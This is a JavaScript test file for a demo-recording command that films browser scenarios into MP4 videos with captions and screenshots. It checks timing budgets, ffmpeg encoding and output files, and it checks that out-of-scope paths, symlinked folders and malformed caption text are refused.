  assert.equal(one.out.trim(), 'Filmed scenario-1: 2 steps in .film/scenario-1/scenario-1.mp4, ' +
    'with the captions scenario-1.vtt.');
  const two = call(['film', 'scenario-2', '--artifacts', here.plan], here.deps);
  assert.equal(two.status, 0, two.out + two.err);
  const pictures = call(['film', 'scenario-3', '--artifacts', here.plan], here.deps);
  assert.equal(pictures.status, 0, pictures.out + pictures.err);
  assert.equal(pictures.out.trim(), 'Took 2 pictures of scenario-3 in .film/scenario-3/, one ' +
    'for each step.');
  // Each folder has only its files: no frame and no list of frames stay.
  assert.deepEqual(fs.readdirSync(path.join(film, 'scenario-1')).sort(),
    ['scenario-1.mp4', 'scenario-1.vtt']);
  assert.deepEqual(fs.readdirSync(path.join(film, 'scenario-2')).sort(),
    ['scenario-2.mp4', 'scenario-2.vtt']);
  assert.deepEqual(fs.readdirSync(path.join(film, 'scenario-3')).sort(),
    ['scenario-3-step-1.png', 'scenario-3-step-2.png']);
  // A film has the frame of 1280 x 720, and runs from step 1 to the end at real speed: the
  // page changes 1.5 s after its load, then the film holds the last frame for 1 s.
  const clock = probe(path.join(film, 'scenario-1', 'scenario-1.mp4'));
  assert.deepEqual([clock.width, clock.height], [1280, 720]);
  const vtt = fs.readFileSync(path.join(film, 'scenario-1', 'scenario-1.vtt'), 'utf8');
  const cues = [...vtt.matchAll(/^(\d\d:\d\d:\d\d\.\d{3}) --> (\d\d:\d\d:\d\d\.\d{3})$/gm)];
  assert.equal(cues.length, 2);
  assert.equal(cues[0][1], '00:00:00.000');
  assert.equal(cues[0][2], cues[1][1]);
  const seconds = (time) => Number(time.slice(6)) + 60 * Number(time.slice(3, 5));
  assert.ok(seconds(cues[1][2]) > 2.4, vtt);
  assert.ok(Math.abs(clock.seconds - seconds(cues[1][2])) < 0.15, `${clock.seconds} s, ${vtt}`);
  assert.ok(vtt.includes('\nStep 2 of scenario-1.\n'), vtt);
  // The film shows the change of the page: its frames at 0.1 s and in its last 0.3 s differ.
  const frame = (...seek) => childProcess.spawnSync(FFMPEG, ['-v', 'error', ...seek, '-i',
    path.join(film, 'scenario-1', 'scenario-1.mp4'), '-frames:v', '1', '-f', 'image2pipe',
    '-vcodec', 'png', '-'], { maxBuffer: 10 * 1024 * 1024 }).stdout;
  assert.notDeepEqual(frame('-ss', '0.1'), frame('-sseof', '-0.3'));
  // The checks of demo-video and screenshot pass on the files.
  const check = (type, ...files) => call(['check', type, ...files], { ...here.deps, cwd: tmp });
  const base = (id) => path.join(film, id, id);
  const video = check('demo-video', `${base('scenario-1')}.mp4`, `${base('scenario-1')}.vtt`);
  assert.equal(video.status, 0, video.out + video.err);
  const shots = check('screenshot', `${base('scenario-3')}-step-1.png`,
    `${base('scenario-3')}-step-2.png`);
  assert.equal(shots.status, 0, shots.out + shots.err);
  // A film opens on step 1: the sign-in is no part of it, and neither is a password.
  assert.ok(!vtt.includes('Sign in'), vtt);
});

test('film: a step that fails keeps the film up to it for the review, with the step first', { skip: NO_FILM }, async () => {
  const here = await filming([scenario('scenario-1', 'film', ORDERS[0],
    [{ do: 'click', target: '#nothing' }])]);
  const done = call(['film', 'scenario-1', '--artifacts', here.plan], here.deps);
  assert.equal(done.status, 5, done.out + done.err);
  const lines = done.out.trim().split('\n');
  assert.equal(lines[0], 'Start demo-reviewer on step 2 of scenario-1, then record it.');
  assert.match(lines[1], /^ {2}action 1 \(click #nothing\) failed: /);
  assert.equal(lines.at(-1), 'Filmed scenario-1 up to step 2: it failed in step 2.');
  const kept = path.join(here.root, '.film', 'scenario-1');
  assert.deepEqual(fs.readdirSync(kept).sort(), ['failed.json', 'scenario-1.mp4', 'scenario-1.vtt']);
  assert.equal(JSON.parse(fs.readFileSync(path.join(kept, 'failed.json'), 'utf8')).step, 2);
});

test('film pages: a picture of each page at each width, after the sign-in of the first script', { skip: NO_BROWSER }, async () => {
  const here = await filming([scenario('scenario-1', 'pictures', ...ORDERS)]);
  const done = call(['film', 'pages', '/orders', '/clock', '--artifacts', here.plan], here.deps);
  assert.equal(done.status, 0, done.out + done.err);
  assert.equal(done.out.trim(), 'Took 6 pictures of 2 pages in .film/pages/ at 360, 768, 1280 ' +
    'px: pages-<N>-<width>.png is the Nth path.');
  const names = fs.readdirSync(path.join(here.root, '.film', 'pages')).sort();
  assert.deepEqual(names, ['pages-1-1280.png', 'pages-1-360.png', 'pages-1-768.png',
    'pages-2-1280.png', 'pages-2-360.png', 'pages-2-768.png']);
  // The width of a PNG is at bytes 16 to 19 of its header.
  const width = (name) => fs.readFileSync(path.join(here.root, '.film', 'pages', name))
    .readUInt32BE(16);
  assert.deepEqual(['pages-1-360.png', 'pages-1-768.png', 'pages-1-1280.png'].map(width),
    [360, 768, 1280]);
});

test('film pages: a path outside the App address is refused before any run', async () => {
  const here = await filming([scenario('scenario-1', 'pictures', ...ORDERS)]);
  const plan = pinnedPlan(['App address: `http://127.0.0.1:41111/app`'], 'node app/server.cjs');
  const done = call(['film', 'pages', '/app/x', '/admin', '--artifacts', plan], here.deps);
  assert.equal(done.status, 1, done.out + done.err);
  assert.equal(done.out.split('\n')[0],
    'Open only pages under http://127.0.0.1:41111/app, as paths that start with /.');
  assert.equal(fs.existsSync(path.join(here.root, '.film')), false);
  // A path that starts with // names a host, so it is another origin and is refused too.
  const host = call(['film', 'pages', '//example.com/app/x', '--artifacts', plan], here.deps);
  assert.equal(host.status, 1, host.out + host.err);
});

test('film: a link in place of .film is refused before the browser starts', async () => {
  const here = await filming([scenario('scenario-1', 'pictures', ...ORDERS)]);
  const outside = fs.mkdtempSync(path.join(tmp, 'outside-'));
  fs.symlinkSync(outside, path.join(here.root, '.film'));
  const done = call(['film', 'scenario-1', '--artifacts', here.plan], here.deps);
  assert.equal(done.status, 3, done.out + done.err);
  assert.equal(done.out.split('\n')[0], 'Make the artifact folder writable, and remove .film if ' +
    'it is a link.');
  assert.deepEqual(fs.readdirSync(outside), []);
});

test('film: a film scenario with no ffmpeg exits 3 with the fix, a missing script exits 3, bad arguments exit 2', async () => {
  const here = await filming([scenario('scenario-1', 'film', ...ORDERS)]);
  const deps = { ...here.deps,
    preflight: { ...here.deps.preflight, ffmpegs: [path.join(tmp, 'x')] } };
  const none = call(['film', 'scenario-1', '--artifacts', here.plan], deps);
  assert.equal(none.status, 3, none.out + none.err);
  assert.equal(none.out.split('\n')[0], 'Add ffmpeg to the dev container, then run film ' +
    'again.');
  const absent = call(['film', 'scenario-2', '--artifacts', here.plan], here.deps);
  assert.equal(absent.status, 3, absent.out + absent.err);
  assert.equal(absent.out.split('\n')[0],
    'Push the demo script of scenario-2, then run film scenario-2 again.');
  for (const argv of [['film'], ['film', 'scenario-1', 'scenario-2'], ['film', 'one'],
    ['film', 'pages']]) {
    assert.equal(call(argv, here.deps).status, 2, argv.join(' '));
  }
});

test('film: the runner, its stop and the ffmpeg limit of a late run end within 585 s', () => {
  const budget = require(path.join(SKILL, 'lib/budget.cjs'));
  assert.equal(budget.CALL_MS, budget.TOOL_CALL_MS - budget.MARGIN_MS);
  assert.equal(preflight.RUN_BUDGET_MS, budget.RUN_BUDGET_MS);
  // A runner that takes all of its budget, and 15 s more to stop: ffmpeg gets what is left of
  // the call, and the three end within CALL_MS.
  const spent = budget.RUN_BUDGET_MS + preflight.STOP_MS;
  assert.ok(spent + filmVerb.ffmpegLimitMs(spent) <= budget.CALL_MS);
  // ffmpeg gets its 90 s after a quick run, and 5 s at the least after a late one.
  assert.equal(filmVerb.ffmpegLimitMs(0), filmVerb.FFMPEG_MS);
  assert.equal(filmVerb.ffmpegLimitMs(540000), 45000);
  assert.equal(filmVerb.ffmpegLimitMs(700000), 5000);
});

test('film: the longest script that demo check accepts is not stopped by the runner, and one second more is refused', () => {
  const budget = require(path.join(SKILL, 'lib/budget.cjs'));
  const demoScript = require(path.join(SKILL, 'lib/demo-script.cjs'))({ ...LIBRARY,
    stepRows: () => [] });
  const waits = (...list) => scenario('scenario-1', 'film', ...list.map((ms) => [
    { do: 'wait', text: 'Done', timeout_ms: ms }]));
  const shortened = (data) => demoScript.scriptFindings({ title: data.title, lines: [] }, data,
    'scenario-1.json').filter((one) => one.startsWith('Shorten the waits'));
  // The waits of the share, 415 s, in 7 steps: 6 of 60 s and one of 55 s.
  const longest = waits(60000, 60000, 60000, 60000, 60000, 60000, 55000);
  assert.deepEqual(shortened(longest), []);
  assert.equal(shortened(waits(60000, 60000, 60000, 60000, 60000, 60000, 56000)).length, 1);
  const loaded = LIBRARY.schema.load(path.join(SKILL, 'schemas'), 'demo-script');
  assert.deepEqual(LIBRARY.schema.errors(loaded, longest, 'scenario-1.json'), []);
  const actions = [...longest.setup, ...longest.steps.flatMap((step) => step.actions)];
  const limit = preflight.scriptLimitMs({ maxMs: budget.RUN_BUDGET_MS }, actions);
  assert.ok(limit >= budget.START_MS + budget.WAITS_MS);
  // The start of the browser and the sign-in of a normal setup fit in the start allowance and
  // leave room for the app.
  assert.ok(BROWSER_START_MS + preflight.signInMs(SIGN_IN, replay.ACTION_MS,
    replay.SIGNED_IN_MS) < budget.START_MS);
});

test('film: the encode takes the arguments of ffmpeg that make 25 frames a second', () => {
  assert.ok(filmVerb.ffmpegArguments('scenario-1', '1.000').join(' ')
    .includes('concat -i frames.txt -vf fps=25,tpad=stop_mode=clone:stop_duration=1.000'));
});

test('film: the encode of a film of 480 s at 56 frames a second ends within the time of the call', { skip: !(FFMPEG && FFPROBE && process.env.FILM_ENCODE_TIMING) && 'set FILM_ENCODE_TIMING=1 to run this encode, which takes about 25 s' }, () => {
  const budget = require(path.join(SKILL, 'lib/budget.cjs'));
  const dir = fs.mkdtempSync(path.join(tmp, 'encode-'));
  // 56 distinct frames, each linked 480 times: 26,880 frames, one every 1/56 s.
  assert.equal(childProcess.spawnSync(FFMPEG, ['-v', 'error', '-f', 'lavfi', '-i',
    'testsrc2=size=1280x720:rate=25', '-frames:v', '56', '-q:v', '4', path.join(dir, 's%02d.jpg')])
    .status, 0);
  const lines = [];
  const count = 480 * 56;
  for (let at = 0; at < count; at += 1) {
    const name = `f${String(at + 1).padStart(6, '0')}.jpg`;
    fs.linkSync(path.join(dir, `s${String((at % 56) + 1).padStart(2, '0')}.jpg`),
      path.join(dir, name));
    lines.push(`file '${name}'`, `duration ${(1 / 56).toFixed(3)}`);
  }
  lines.push(`file 'f${String(count).padStart(6, '0')}.jpg'`);
  fs.writeFileSync(path.join(dir, 'frames.txt'), `${lines.join('\n')}\n`);
  const before = Date.now();
  const made = childProcess.spawnSync(FFMPEG, filmVerb.ffmpegArguments('scenario-1', '1.000'),
    { cwd: dir, timeout: filmVerb.FFMPEG_MS, killSignal: 'SIGKILL', encoding: 'utf8' });
  const took = Date.now() - before;
  assert.equal(made.status, 0, made.stderr);
  assert.ok(took < budget.ENCODE_MS, `${took} ms for ${count} frames`);
  assert.ok(probe(path.join(dir, 'scenario-1.mp4.tmp')).seconds > 479);
});

// A runner for the film tests that starts no browser: FILM_FAKE says what it returns. 'late'
// is a run past its limit, 'bad' a frame with a name that the runner never gives, and 'ok' two
// frames written to the folder of the capture.
const FAKE_RUNNER = path.join(tmp, 'film-runner.cjs');
fs.writeFileSync(FAKE_RUNNER, `const fs = require('fs');
const spec = JSON.parse(fs.readFileSync(0, 'utf8'));
const mode = process.env.FILM_FAKE;
const dir = spec.runs[0].capture.dir;
let capture = null;
if (mode === 'pictures') {
  fs.writeFileSync(dir + '/scenario-1-step-1.png', 'png');
  capture = { kind: 'pictures', files: ['scenario-1-step-1.png'] };
} else if (mode !== 'late' && mode !== 'start' && mode !== 'signin') {
  const files = mode === 'bad' ? ['../outside.jpg'] : ['f000001.jpg', 'f000002.jpg'];
  for (const file of files) if (mode !== 'bad') fs.writeFileSync(dir + '/' + file, 'x');
  capture = { kind: 'film', frames: files.map((file, at) => ({ file, at: at * 40 })),
    starts: [0], end: 1040 };
}
const run = mode === 'late' ? null : mode === 'start' ? { ok: false, step: 0, outside: null,
  why: 'the browser failed: the time for the start ran out before the browser started',
  browser: true, late: true } : mode === 'signin' ? { ok: false, step: 0, outside: null,
  why: 'action 2 (wait for Done) failed: the page showed no such text within 1 s', late: true } : { ok: true, step: null, why: null, outside: null, capture };
const result = { app: { started: true, ran: true, why: null }, signIns: [],
  runs: run ? [run] : [], unfinished: mode === 'late' ?
    'the script runs ran past the limit of 535 s' : null };
fs.writeFileSync(spec.resultFile, JSON.stringify(result) + '\\n', { flag: 'wx' });
`);
const FAKE_FFMPEG = path.join(tmp, 'fake-ffmpeg');
fs.writeFileSync(FAKE_FFMPEG, '#!/bin/sh\n: > scenario-1.mp4.tmp\n', { mode: 0o755 });
const FAILING_FFMPEG = path.join(tmp, 'failing-ffmpeg');
fs.writeFileSync(FAILING_FFMPEG, '#!/bin/sh\necho boom >&2\nexit 1\n', { mode: 0o755 });

// faked returns the checkout of a scenario that films with the fake runner and ffmpeg, and the
// dependencies of call with FILM_FAKE in the environment and ffmpeg as the ffmpeg.
async function faked(fake, ffmpeg, browsers = [process.execPath]) {
  const here = await filming([scenario('scenario-1', 'film', ...ORDERS)]);
  const deps = { ...here.deps, env: { ...here.deps.env, FILM_FAKE: fake },
    preflight: { ...here.deps.preflight, browsers, runner: FAKE_RUNNER,
      ffmpegs: [ffmpeg] } };
  return { ...here, deps, film: path.join(here.root, '.film') };
}

test('film: a runner past its limit, a bad frame and a failing ffmpeg remove the new folder', async () => {
  for (const [fake, ffmpeg, line] of [
    ['late', FAKE_FFMPEG, /^Shorten the waits or the steps of scenario-1\.json, then film it /],
    ['bad', FAKE_FFMPEG, /^End the run: the runner stored a frame that cannot be read\./],
    ['ok', FAILING_FFMPEG, /^End the run: ffmpeg did not make the film of scenario-1\./]]) {
    const here = await faked(fake, ffmpeg);
    const done = call(['film', 'scenario-1', '--artifacts', here.plan], here.deps);
    assert.equal(done.status, 3, `${fake}: ${done.out}${done.err}`);
    assert.match(done.out.split('\n')[0], line, fake);
    // The folder .film has no scenario-1, no frame and no list of frames.
    assert.deepEqual(fs.readdirSync(here.film), [], fake);
  }
});

// stopText returns the two lines of a film call that the limit of the runner stopped, for a
// scenario with the evidence in kind, run with the dependencies of faked.
async function stopText(kind, fake = 'late') {
  const here = await filming([scenario('scenario-1', kind, ...ORDERS)]);
  const deps = { ...here.deps, env: { ...here.deps.env, FILM_FAKE: fake },
    preflight: { ...here.deps.preflight, browsers: [process.execPath], runner: FAKE_RUNNER,
      ffmpegs: [FAKE_FFMPEG] } };
  const done = call(['film', 'scenario-1', '--artifacts', here.plan], deps);
  assert.equal(done.status, 3, done.out + done.err);
  const limit = preflight.scriptLimitMs({ ...deps.preflight, maxMs: preflight.RUN_BUDGET_MS },
    [...SIGN_IN, ...ORDERS[0]]);
  return { lines: done.out.split('\n').slice(0, 2), seconds: Math.ceil(limit / 1000),
    status: done.status };
}

test('film: a run that the limit stops prints the film text, not the text of preflight', async () => {
  const film = await stopText('film');
  assert.deepEqual(film.lines, ['Shorten the waits or the steps of scenario-1.json, then film ' +
    'it again.', `  The film ran past its limit of ${film.seconds} s.`]);
  const pictures = await stopText('pictures');
  assert.deepEqual(pictures.lines, ['Shorten the waits or the steps of scenario-1.json, then ' +
    'run it again.', `  The run ran past its limit of ${pictures.seconds} s.`]);
});

test('film: a start deadline that ran out before the browser started prints the fix first', async () => {
  const film = await stopText('film', 'start');
  assert.deepEqual(film.lines, ['Shorten the sign-in steps of scenario-1.json, or make the app ' +
    'start faster, then film it again.', '  The 120 s for the app start, the sign-in and the ' +
    'browser ran out before the browser started.']);
  const pictures = await stopText('pictures', 'start');
  assert.equal(pictures.lines[0], 'Shorten the sign-in steps of scenario-1.json, or make the ' +
    'app start faster, then run it again.');
  // A sign-in that fails after the deadline prints the same lines, not "Check the sign-in".
  const signin = await stopText('film', 'signin');
  assert.deepEqual(signin.lines, film.lines);
  assert.equal(signin.status, 3);
});

test('film: the pictures have the names that screenshot reads, and running-checks lists the two pushes', async () => {
  const again = await filming([scenario('scenario-1', 'pictures', ...ORDERS)]);
  const deps = { ...again.deps, env: { ...again.deps.env, FILM_FAKE: 'pictures' },
    preflight: { ...again.deps.preflight, browsers: [process.execPath], runner: FAKE_RUNNER } };
  const done = call(['film', 'scenario-1', '--artifacts', again.plan], deps);
  assert.equal(done.status, 0, done.out + done.err);
  const file = path.join(again.root, '.film', 'scenario-1', 'scenario-1-step-1.png');
  const check = call(['check', 'screenshot', file], { ...again.deps, cwd: tmp });
  assert.equal(check.status, 0, check.out + check.err);
  const skill = fs.readFileSync(path.join(MODULES,
    'software-factory/skills/running-checks/SKILL.md'), 'utf8');
  assert.ok(skill.includes('<qory> artifact push screenshot --name <id> ' +
    '<folder>/.film/<id>/<id>-step-*.png'), 'the push of the pictures');
  assert.ok(skill.includes('<qory> artifact push demo-video --name <id> \\\n  ' +
    '<folder>/.film/<id>/<id>.mp4 <folder>/.film/<id>/<id>.vtt'), 'the push of the film');
});

test('replay: an open of a step outside the App address fails, and an open under it passes', async () => {
  const opened = [];
  const page = { guard: async () => {}, goto: async (url) => { opened.push(url); } };
  const options = { base: 'http://127.0.0.1:41111/app', origin: 'http://127.0.0.1:41111' };
  const outside = await replay.replay(page, [{ do: 'open', url: '/admin' }], options);
  assert.equal(outside.failure.words, 'action 1 (open /admin) failed: the address is outside ' +
    'the App address http://127.0.0.1:41111/app');
  assert.deepEqual(opened, []);
  const under = await replay.replay(page, [{ do: 'open', url: '/app/orders' }], options);
  assert.equal(under.failure, null);
  assert.deepEqual(opened, ['http://127.0.0.1:41111/app/orders']);
});

test('replay: after the deadline of the start allowance, the next action fails and each wait is cut', async () => {
  const waited = [];
  const page = { guard: async () => {}, click: async (target, ms) => {
    waited.push(ms);
    await new Promise((resolve) => { setTimeout(resolve, 80); });
  } };
  const until = Date.now() + 100;
  const done = await replay.replay(page, [{ do: 'click', target: '#a' },
    { do: 'click', target: '#b' }, { do: 'click', target: '#c' }],
  { base: 'http://127.0.0.1:41111/', origin: 'http://127.0.0.1:41111', actionMs: 60000, until });
  // The first click may wait what is left of 100 ms, not 60 s; the third starts too late.
  assert.ok(waited[0] <= 100, `${waited}`);
  assert.equal(done.failure.place, 2);
  assert.equal(done.failure.why,
    'the time for the start of the app, the browser and the sign-in ran out');
});

test('film: a slow start of the app and a sign-in that waits too long stop the run at the deadline', { skip: NO_BROWSER }, async () => {
  const here = checkout();
  const port = await freePort();
  // The app starts after 1.5 s, and the sign-in waits up to 60 s for a text that never shows.
  const spec = appSpec(here, port, port, { browser: BROWSER, browserMs: BROWSER_MS, startMs: 5000,
    limitMs: 120000, runs: [{ setup: [{ do: 'open', url: '/orders' },
      { do: 'wait', text: 'a text that never shows', timeout_ms: 60000 }],
    steps: [[{ do: 'open', url: '/orders' }]], names: [] }] });
  spec.serve.command = `sleep 1.5; APP_PORT=${port} node app/server.cjs`;
  const began = Date.now();
  const ran = await runner(spec);
  const seconds = (Date.now() - began) / 1000;
  const [one] = JSON.parse(ran.out).runs;
  assert.equal(one.ok, false, ran.out);
  assert.equal(one.step, 0);
  assert.equal(one.late, true);
  // The start allowance is 5 s from the start of the runner: the run ends near it, not at 60 s.
  assert.ok(seconds < 20, `${seconds} s`);
});

test('film: a start deadline with under 1 s left says the time ran out, not "did not start within 0.1 s"', { skip: NO_BROWSER }, async () => {
  const here = checkout();
  const port = await freePort();
  // The app answers about 2.1 s after the start of the runner, of the 2.5 s of the deadline.
  const spec = appSpec(here, port, port, { browser: BROWSER, browserMs: BROWSER_MS, startMs: 2500,
    limitMs: 120000, runs: [{ setup: SIGN_IN, steps: [[{ do: 'open', url: '/orders' }]],
      names: [] }] });
  spec.serve.command = `sleep 1.8; APP_PORT=${port} node app/server.cjs`;
  const [one] = JSON.parse((await runner(spec)).out).runs;
  assert.equal(one.ok, false);
  assert.match(one.why, /^the browser failed: the time for the start ran out/);
  assert.equal(one.late, true);
  assert.doesNotMatch(one.why, /did not start within/);
});

test('film: a machine with no browser exits before it makes the folder, and the earlier film stays', async () => {
  const here = await faked('ok', FAKE_FFMPEG, ['/nonexistent/browser']);
  const earlier = path.join(here.film, 'scenario-1');
  fs.mkdirSync(earlier, { recursive: true });
  fs.writeFileSync(path.join(earlier, 'scenario-1.mp4'), 'earlier film');
  const done = call(['film', 'scenario-1', '--artifacts', here.plan], here.deps);
  assert.equal(done.status, 3, done.out + done.err);
  assert.equal(done.out.split('\n')[0],
    'Add a browser to the dev container, then run preflight again.');
  assert.equal(fs.readFileSync(path.join(earlier, 'scenario-1.mp4'), 'utf8'), 'earlier film');
  const pages = call(['film', 'pages', '/orders', '--artifacts', here.plan], here.deps);
  assert.equal(pages.status, 3, pages.out + pages.err);
  assert.equal(fs.existsSync(path.join(here.film, 'pages')), false);
});

test('film: ffmpeg gets what is left of the call, from the start of the call', async () => {
  // A fake clock: the runner takes 583 s of the call, and ffmpeg gets the 5 s that it has at
  // least. After a quick run it gets 90 s. spawnSync records the timeout of the ffmpeg call.
  const limits = [];
  const real = childProcess.spawnSync;
  const realNow = Date.now;
  let offset = 0;
  Date.now = () => realNow() + offset;
  childProcess.spawnSync = (command, args, options) => {
    const done = real(command, args, options);
    if (command === FAKE_FFMPEG) limits.push(options.timeout);
    else if (command === process.execPath) offset = Number(process.env.FILM_OFFSET);
    return done;
  };
  try {
    for (const [late, expected] of [[0, 90000], [583000, 5000]]) {
      process.env.FILM_OFFSET = String(late);
      offset = 0;
      const here = await faked('ok', FAKE_FFMPEG);
      const done = call(['film', 'scenario-1', '--artifacts', here.plan], here.deps);
      assert.equal(done.status, 0, done.out + done.err);
      assert.equal(limits.at(-1), expected);
      assert.deepEqual(fs.readdirSync(path.join(here.film, 'scenario-1')).sort(),
        ['scenario-1.mp4', 'scenario-1.vtt']);
    }
  } finally {
    childProcess.spawnSync = real;
    Date.now = realNow;
    delete process.env.FILM_OFFSET;
  }
});

test('film: a step title is the text of its cue, and a title with an arrow is refused before the film', async () => {
  const text = filmVerb.captions({ steps: [{ title: 'Save A & B' }] }, { starts: [0], end: 1000 });
  assert.ok(text.includes('\nSave A & B\n'), text);
  const one = scenario('scenario-1', 'film', ORDERS[0], ORDERS[0]);
  one.steps[1].title = 'Save --> done.';
  const here = await filming([one]);
  const done = call(['film', 'scenario-1', '--artifacts', here.plan], here.deps);
  assert.equal(done.status, 1, done.out + done.err);
  assert.deepEqual(done.out.split('\n').slice(0, 2), [
    'Change the Action of step 2 in the demo scenario so it has no "-->", then film it again.',
    '  A cue of scenario-1.vtt cannot hold "-->", which ends the cue in a player.']);
  assert.equal(fs.existsSync(path.join(here.root, '.film')), false);
});

test('film: a result with 40,000 frames passes from the runner, and its file is removed', () => {
  const fake = path.join(tmp, 'fake-runner.cjs');
  fs.writeFileSync(fake, `const fs = require('fs');
const spec = JSON.parse(fs.readFileSync(0, 'utf8'));
const frames = Array.from({ length: 40000 }, (_, at) => ({
  file: 'f' + String(at + 1).padStart(6, '0') + '.jpg', at: at * 12 }));
const capture = { kind: 'film', frames, starts: [0], end: 481000 };
const result = { app: { started: true, ran: true, why: null }, signIns: [],
  runs: [{ ok: true, step: null, why: null, outside: null, capture }], unfinished: null };
fs.writeFileSync(spec.resultFile, JSON.stringify(result) + '\\n', { flag: 'wx' });
`);
  const here = checkout();
  const io = { env: process.env, preflight: { browsers: [process.execPath], runner: fake } };
  const given = { serve: { command: 'true', url: 'http://127.0.0.1:1/', cwd: here.dir },
    script: script('scenario-1', SIGN_IN), capture: { kind: 'film', dir: here.dir },
    keyFix: KEY_FIX };
  const done = preflight.runScript(io, here.root, given);
  assert.equal(done.run.capture.frames.length, 40000);
  assert.ok(JSON.stringify(done.run.capture).length > 1024 * 1024);
  assert.deepEqual(fs.readdirSync(path.join(here.root, '.reports', 'preflight'))
    .filter((name) => name.startsWith('result-')), []);
  // A runner that writes no JSON ends the run with its exit status, and leaves no file.
  const bad = path.join(tmp, 'bad-runner.cjs');
  fs.writeFileSync(bad, `const fs = require('fs');
fs.writeFileSync(JSON.parse(fs.readFileSync(0, 'utf8')).resultFile, 'not json');
`);
  assert.throws(() => preflight.runScript({ ...io, preflight: { ...io.preflight, runner: bad } },
    here.root, given), /did not finish/);
  assert.deepEqual(fs.readdirSync(path.join(here.root, '.reports', 'preflight'))
    .filter((name) => name.startsWith('result-')), []);
});

test('film: the captions have one cue per step, from the start of the step', () => {
  const steps = [{ title: 'Open it.' }, { title: 'Read it.' }, { title: 'Close it.' }];
  const text = filmVerb.captions({ steps }, { starts: [0, 1250, 61000], end: 3723456 });
  assert.equal(text, 'WEBVTT\n\n1\n00:00:00.000 --> 00:00:01.250\nOpen it.\n\n' +
    '2\n00:00:01.250 --> 00:01:01.000\nRead it.\n\n3\n00:01:01.000 --> 01:02:03.456\n' +
    'Close it.\n');
  assert.equal(filmVerb.stamp(7), '00:00:00.007');
});

// A page of the capture tests: it records what capture asks of it.
function fakePage() {
  const page = { calls: [], frame: null };
  page.screenshot = async (format = 'png') => {
    page.calls.push(`screenshot ${format}`);
    return Buffer.from(format);
  };
  page.resize = async (width) => { page.calls.push(`resize ${width}`); };
  page.screencast = async (onFrame) => {
    page.frame = onFrame;
    page.calls.push('screencast');
    return async () => { page.calls.push('stop'); };
  };
  return page;
}

test('capture: a film keeps the frame of each change from the start of step 1, and stops its screencast', async () => {
  const dir = fs.mkdtempSync(path.join(tmp, 'capture-'));
  const page = fakePage();
  const taken = await capture(page, { kind: 'film', dir, name: 'scenario-1' });
  await taken.begin(0);
  page.frame(Buffer.from('a'));
  await taken.end(0);
  await taken.begin(1);
  const done = await taken.finish();
  assert.deepEqual(page.calls, ['screenshot jpeg', 'screencast', 'stop', 'screenshot jpeg']);
  assert.equal(done.kind, 'film');
  assert.deepEqual(done.frames.map((one) => one.file), ['f000001.jpg', 'f000002.jpg',
    'f000003.jpg']);
  assert.equal(done.starts.length, 2);
  assert.equal(done.starts[0], 0);
  assert.equal(done.frames[0].at, 0);
  assert.equal(done.end, done.frames.at(-1).at + 1000);
  assert.equal(fs.readFileSync(path.join(dir, 'f000002.jpg'), 'utf8'), 'a');
});

test('capture: a film of 8 steps that run past 151 s keeps every frame of a page that paints 56 times a second, and its captions end within it', async () => {
  const dir = fs.mkdtempSync(path.join(tmp, 'capture-'));
  const page = fakePage();
  const realNow = Date.now;
  let now = 1000000;
  Date.now = () => now;
  try {
    const taken = await capture(page, { kind: 'film', dir, name: 'scenario-1' });
    // Steps of 58 s each: they start at 0, 58, 116, 174 ... 406 s, and the last ends at 464 s.
    const starts = Array.from({ length: 8 }, (_, at) => 58000 * at);
    const origin = now;
    let sent = 0;
    for (let at = 0; at < 8; at += 1) {
      now = origin + starts[at];
      await taken.begin(at);
      for (let paint = Math.ceil(starts[at] * 56 / 1000) + 1;
        paint * 1000 / 56 < starts[at] + 58000; paint += 1) {
        now = origin + Math.round(paint * 1000 / 56);
        page.frame(Buffer.from('p'));
        sent += 1;
      }
      await taken.end(at);
    }
    now = origin + 464000;
    const done = await taken.finish();
    // The first and the last frame come from a screenshot: no painted frame is dropped.
    assert.equal(done.frames.length, sent + 2);
    assert.equal(fs.readdirSync(dir).length, sent + 2);
    assert.ok(sent > 9000 && done.frames.at(-1).at > 151000);
    assert.deepEqual(done.starts, starts);
    const steps = starts.map((_, at) => ({ title: `Step ${at + 1}.` }));
    const text = filmVerb.captions({ steps }, done);
    const cues = [...text.matchAll(/^(\d\d:\d\d:\d\d\.\d{3}) --> (\d\d:\d\d:\d\d\.\d{3})$/gm)];
    const ms = (time) => ((Number(time.slice(0, 2)) * 60 + Number(time.slice(3, 5))) * 60 +
      Number(time.slice(6))) * 1000;
    assert.equal(cues.length, 8);
    for (const [, from, to] of cues) assert.ok(ms(from) < done.end && ms(to) <= done.end, text);
    assert.equal(ms(cues[7][2]), done.end);
  } finally {
    Date.now = realNow;
  }
});

test('capture: pictures take the page after each step, and pages at each width', async () => {
  const dir = fs.mkdtempSync(path.join(tmp, 'capture-'));
  const page = fakePage();
  const pictures = await capture(page, { kind: 'pictures', dir, name: 'scenario-4' });
  await pictures.end(0);
  await pictures.end(1);
  assert.deepEqual(fs.readdirSync(dir).sort(), ['scenario-4-step-1.png', 'scenario-4-step-2.png']);
  assert.deepEqual(page.calls, ['screenshot png', 'screenshot png']);
  const other = fs.mkdtempSync(path.join(tmp, 'capture-'));
  const wide = fakePage();
  const pages = await capture(wide, { kind: 'pages', dir: other, name: 'pages',
    widths: [360, 1280] });
  await pages.end(0);
  assert.deepEqual(wide.calls, ['resize 360', 'screenshot png', 'resize 1280', 'screenshot png',
    'resize 1280']);
  assert.deepEqual((await pages.finish()).files, ['pages-1-360.png', 'pages-1-1280.png']);
});
